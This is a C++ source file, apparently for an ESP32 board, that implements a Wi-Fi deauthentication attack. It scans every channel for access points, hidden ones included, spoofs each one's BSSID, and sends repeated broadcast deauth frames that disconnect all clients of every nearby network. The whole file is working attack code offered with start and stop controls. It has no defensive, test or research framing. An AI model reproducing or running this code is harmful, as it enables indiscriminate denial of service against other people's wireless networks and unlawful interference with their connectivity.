#include "deauther.h"
#include "esp_wifi.h"
#include "esp_err.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <cstring>  // Include for memcpy

// Deauthentication packet template
const uint8_t deauthPacket[] = {
  0xC0, 0x00, 0x00, 0x00,                         // Type: Management, Subtype: Deauth
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,             // Destination: Broadcast
  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,             // Source: Will be replaced
  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,             // BSSID: Will be replaced
  0x00, 0x00,                                     // Sequence number
  0x01, 0x00                                      // Reason: Unspecified
};

volatile bool deauthActive = false;
TaskHandle_t deauthTaskHandle = NULL;

void deauthTask(void *pvParameters) {
  // Initialize Wi-Fi
  esp_wifi_init(nullptr);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_APSTA);
  esp_wifi_start();
  
  const uint8_t channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13};
  uint8_t channelIndex = 0;
  
  while(deauthActive) {
    // Set channel
    uint8_t channel = channels[channelIndex];
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    
    // Scan for networks
    wifi_scan_config_t scanConf = {
      .ssid = nullptr,
      .bssid = nullptr,
      .channel = channel,
      .show_hidden = true
    };
    
    if(esp_wifi_scan_start(&scanConf, true) == ESP_OK) {
      uint16_t apCount = 0;
      esp_wifi_scan_get_ap_num(&apCount);
      
      if(apCount > 0) {
        wifi_ap_record_t* apRecords = new wifi_ap_record_t[apCount];
        uint16_t count = apCount;
        esp_wifi_scan_get_ap_records(&count, apRecords);
        
        for(int i = 0; i < count && deauthActive; i++) {
          // Prepare packet
          uint8_t packet[sizeof(deauthPacket)];
          memcpy(packet, deauthPacket, sizeof(deauthPacket));
          
          // Insert BSSID
          memcpy(&packet[10], apRecords[i].bssid, 6);  // Source
          memcpy(&packet[16], apRecords[i].bssid, 6);  // BSSID
          
          // Send multiple deauth packets
          for(int j = 0; j < 5; j++) {
            esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
            vTaskDelay(10 / portTICK_PERIOD_MS);
          }
        }
        delete[] apRecords;
      }
    }
    
    // Move to next channel
    channelIndex = (channelIndex + 1) % (sizeof(channels)/sizeof(channels[0]));
    vTaskDelay(300 / portTICK_PERIOD_MS);
  }
  
  // Cleanup
  esp_wifi_stop();
  esp_wifi_deinit();
  vTaskDelete(NULL);
}

void startDeauth() {
  if(deauthTaskHandle != NULL) return;
  
  deauthActive = true;
  xTaskCreatePinnedToCore(
    deauthTask,     // Task function
    "deauth_task",  // Name
    8192,           // Stack size
    NULL,           // Parameters
    1,              // Priority
    &deauthTaskHandle,
    0               // Core
  );
}

void stopDeauth() {
  deauthActive = false;
  if(deauthTaskHandle != NULL) {
    vTaskDelay(200 / portTICK_PERIOD_MS); // Allow task to exit
    deauthTaskHandle = NULL;
  }
}